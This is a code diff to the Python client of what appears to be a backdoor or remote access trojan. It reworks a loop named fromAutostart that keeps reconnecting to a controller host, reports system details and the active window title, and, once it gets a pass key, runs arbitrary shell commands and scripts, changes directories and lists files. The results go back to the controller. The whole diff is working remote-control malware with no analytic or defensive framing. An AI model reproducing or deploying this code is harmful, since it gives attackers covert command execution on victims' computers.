@@ -91,7 +91,7 @@ def iam():
     data['ostype'] = str(sys.platform)
     data['os'] = str(platform.platform())
     data['protection'] = str(unlocked)
-    data['activewindowtitle'] = str(GetWindowTitle())
+    data['activewindowtitle'] = GetWindowTitle()
     return str(data)
 
 def fromAutostart():
@@ -100,67 +100,70 @@ def fromAutostart():
     global unlocked
     while True:
         try:
-            if not unlocked:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((HOST, PORT))
-                except:
-                    s.close()
-                    active = False
-                    time.sleep(5)
-            data = Receive(s)
-            if data == 'whoareyou':
-                Send(s, iam())
-            if data == passKey:
-                active = True
-                Send(s, 'iamactive')
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((HOST, PORT))
+        except:
+            s.close()
+            active = False
+            time.sleep(5)
+            continue
 
-                while active:
-                    data = Receive(s)
-                    if data == '':
-                        time.sleep(0.02)
+        while 1:
+            try:
+                data = Receive(s)
+                if data == 'whoareyou':
+                    Send(s, iam())
+                    continue
+                if data == passKey:
+                    active = True
+                    Send(s, 'iamactive')
+
+                    while active:
+                        data = Receive(s)
+                        if data == '':
+                            time.sleep(0.02)
+                        if data == "terminate":
+                            Send(s, "quitted")
+                            active = False
+                            break
+                        elif data.startswith("cd "):
+                            try:
+                                os.chdir(data[3:])
+                                stdoutput = ""
+                            except:
+                                stdoutput = "Error opening directory.\n"
+                        elif data.startswith(("Activate")):
+                            stdoutput = ''
+                        elif data.startswith("runscript"):
+                            stdoutput = Execute(data[10:])
+                        elif data.startswith("ls"):
+                            string = {}
+                            try:
+                                for n, i in enumerate(os.listdir(u'.')):
+                                    string[n] = {}
+                                    string[n]['name'] = i
+                                    string[n]['type'] = os.path.isfile(i)
+                                    string[n]['size'] = os.path.getsize(i)
+                                    string[n]['modified'] = time.ctime(os.path.getmtime(i))
+                                    string[n]['hidden'] = has_hidden_attribute(i)
+                                stdoutput = str(string)
+                            except WindowsError:
+                                stdoutput = 'Access is denied'
+                        else:
+                            stdoutput = Exec(data)
+                        stdoutput = '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>\n\n'+stdoutput
+                        Send(s, stdoutput)
                     if data == "terminate":
-                        Send(s, "quitted")
-                        active = False
                         break
-                    elif data.startswith("cd "):
-                        try:
-                            os.chdir(data[3:])
-                            stdoutput = ""
-                        except:
-                            stdoutput = "Error opening directory.\n"
-                    elif data.startswith(("Activate")):
-                        stdoutput = ''
-                    elif data.startswith("runscript"):
-                        stdoutput = Execute(data[10:])
-                    elif data.startswith("ls"):
-                        string = {}
-                        try:
-                            for n, i in enumerate(os.listdir(u'.')):
-                                string[n] = {}
-                                string[n]['name'] = i
-                                string[n]['type'] = os.path.isfile(i)
-                                string[n]['size'] = os.path.getsize(i)
-                                string[n]['modified'] = time.ctime(os.path.getmtime(i))
-                                string[n]['hidden'] = has_hidden_attribute(i)
-                            stdoutput = str(string)
-                        except WindowsError:
-                            stdoutput = 'Access is denied'
-                    else:
-                        stdoutput = Exec(data)
-                    stdoutput = '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>\n\n'+stdoutput
-                    Send(s, stdoutput)
-                if data == "terminate":
-                    break
-                time.sleep(3)
-            else:
-                Send(s, 'Access Denied')
-                unlocked = True
-        except socket.error:
+                    time.sleep(3)
+                else:
+                    Send(s, 'Access Denied')
+            except socket.error:
                 s.close()
                 active = False
                 unlocked = False
                 time.sleep(10)
+                break
 
 
 fromAutostart()
